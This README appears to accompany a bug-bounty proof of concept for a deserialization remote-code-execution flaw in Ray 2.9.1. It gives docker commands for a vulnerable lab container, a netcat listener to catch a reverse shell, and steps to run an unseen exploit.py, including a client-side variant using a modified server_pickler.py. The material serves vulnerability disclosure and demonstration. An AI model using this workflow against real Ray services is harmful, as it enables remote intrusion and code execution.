# Ray 2.9.1 Deserialization Demo (Reverse Shell) - CWE-502

Report: https://huntr.com/bounties/ce6cb61c-fce1-406f-80e2-f3b7cdddbd6f

Resources:
   - https://docs.ray.io/en/latest/ray-overview/installation.html
   - https://github.com/ray-project/ray


## Overview
### Description
This is an RCE for Ray 2.9.1. The exploit is a deserialization attack that allows an attacker to execute arbitrary code on the target machine. The attack is performed by sending a malicious serialized object to the Ray service.

### Rating
The vulnerability has been rated as `Critical` with a CVSS score of `9.8`. This is because the vulnerability is remotely exploitable and allows an attacker to execute arbitrary code on the target machine.


## Commands - Server Exploit
### Terminal 1 - Start the Service

Pull the image from dockerhub using `docker pull rayproject/ray:2.9.1` or build the image using the provided `Dockerfile`. Note, if the image is pulled from dockerhub, then the client python version must be `>=3.8` and the `ncat` command must be installed manually.

```bash
docker build -t ray-cwe-demo:2.9.1 --no-cache .
docker run -it -p 10001:10001 -p 10002:10002 -p 10003:10003 -p 10004:10004 -p 4321:4321 --add-host host.docker.internal:host-gateway --shm-size=4.43gb ray-cwe-demo:2.9.1
```

### Terminal 2 - `netcat` Listener
```bash
nc -lvp 4321
```

### Terminal 3 - Attack
```bash
python3.8 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python exploit.py
```

## Commands - Client Exploit
### Terminal 1 - Start the Service

Here we mount a modified version of `server_pickler.py` to the container. The modified file contains the malicious payload that will be executed on the client.

```bash
docker run -it \
  -p 10001:10001 \
  -p 10002:10002 \
  -p 10003:10003 \
  -p 10004:10004 \
  -p 4321:4321 \
  -v "$(pwd)/server_pickler.py:/home/ray/anaconda3/lib/python3.8/site-packages/ray/util/client/server/server_pickler.py" \
  --add-host host.docker.internal:host-gateway \
  --shm-size=4.43gb \
  ray-cwe-demo:2.9.1
```

### Terminal 2 - `netcat` Listener
```bash
nc -lvp 4321
```

### Terminal 3 - Attack
```bash
python3.8 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python exploit.py
```
